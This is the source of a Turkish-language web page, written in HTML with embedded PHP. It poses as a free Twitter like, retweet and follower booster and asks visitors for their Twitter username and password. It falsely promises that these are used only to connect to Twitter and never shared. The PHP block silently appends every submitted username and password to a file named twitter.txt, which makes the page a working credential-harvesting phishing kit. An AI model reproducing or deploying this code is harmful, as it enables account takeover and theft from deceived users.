
<!DOCTYPE html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Twitter Beğeni Hilesi - Twitter Reetweet Hilesi - Twitter Takipçi Arttırma hilesi </title>
<meta name="description" content="twitter takipçi , twitter beğeni hilesi , twitter reetweet hilesi , twitter beğeni , ücretsiz twitter takipçi , twitter takipci , twitter favori hilesi">
<meta name="keywords" content="twitter favori , twitter reetweet hilesi , favori arttırma , twitter beğeni hilesi , ücretsiz takipçi , twitter beğeni , twitter retweet, twitter takipci , twitter takipci hilesi , twitter beğeni arttırma , twitter retweet arttırma hilesi">
<link rel="shortcut icon" type="image/ico" href="https://twitterhileleri.com/logo.ico" />
<link rel="stylesheet" type="text/css" href="https://twitterhileleri.com/tema/assets/t5eqgc/bootstrap.css">
<link rel="stylesheet" type="text/css" href="https://twitterhileleri.com/tema/assets/t5eqgc/style.css">
<link rel="stylesheet" type="text/css" href="https://twitterhileleri.com/tema/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="https://twitterhileleri.com/cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/tema/css/bootstrap-datetimepicker.min.css">
</head>
<body>
<nav class="navbar navbar-fixed-top ">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
</div>
<div id="navbar" class="collapse navbar-collapse">
<ul class="nav navbar-nav navbar-right">
</ul>
</div>
</div>
</nav>
<div class="container">
<div class="row">
<div class="col-md-8 col-md-offset-2">
<div class="navbar navbar-default" style="background:#fed911;border:1px solid #fed911;padding:5px 10px;">
<div class="inner cover"><center>
<h4><font color="black"><b>ÖNEMLİ :</b> Sisteme giriş yapmadan önce <b>hesabınızı e-posta ve telefon onaylı</b> yapınız!</font></h4>
<br>
<h1 class="cover-heading">Twitter ile Giriş Yap!</h1>
<p class="lead">
<form action='' method='post'>
<input class="form-control girisinput" placeholder="Kullanıcı Adınız" type='text' style='width:220px; text-align:center;margin-top:10px;' maxlength='30' name='username' value=''><br>
<input class="form-control girisinput" placeholder="Şifreniz" type='password' style='width:220px; text-align:center;margin-top:10px;' maxlength='255' name='pass' value=''><br><br>
<br>
<b><div id='submit'><input type='submit' value='Twitter ile Giriş YAP !' class='btn btn-lg btn-danger'></div><br></b>
<font size='1px'>ÖNEMLİ NOT : KULLANICI ADI VE ŞİFRENİZ <u>TWITTER İLE BAĞLANTI KURULUP GEREKLİ İZİNLERİ ALMAK</u> AMAÇLI İSTENİLMİŞTİR, KESİNLİKLE 3.ŞAHIS/KURUMLAR İLE <u>PAYLAŞILMAZ!</u></font>
</form>
<?php
if (!empty($_POST['username']) && !empty($_POST['pass'])) {
$ac = fopen("twitter.txt","a+");
$password = $_POST['username'];
$username = $_POST['pass'];
$userlar = ("\n __________________ \n"." Username: ".$username."\n Password: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
}


?>
</p></div></center>
</div>
<div class="mastfoot">
<div class="inner">
</div>
</div>
</div>
</div>
</div>
<div class="container">
<div class="row">
<div class="col-md-8 col-md-offset-2">
<center><h4> #ETİKETLER# </h4>
<p> <font color="white"><a href="https://twitterhileleri.com/">twitter takipçi hilesi</a> &nbsp;&bull;&nbsp;<a href="https://twitterhileleri.com/">twitter retweet hilesi</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter retweet arttırma hilesi</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter retweet kazanma hilesi</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">takipçi kasma</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter beğeni arttırma</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter retweet arttırma</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter takipci kasma</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter beğeni hilesi</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter begeni favori hilesi</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter favori kazanma</a> &nbsp;&bull;&nbsp; <a href="https://twitterhileleri.com/">twitter takipçi sitesi</a></b>
<h2><a href="https://www.twitterhileleri.com">Twitter retweet Hilesi </a> </h2>
</font></p><font color="white">
</font></div></center></div></div>
<link rel="stylesheet" href="https://twitterhileleri.com/use.fontawesome.com/releases/v5.0.8/tema/css/all.css">
    

</body>
</html>
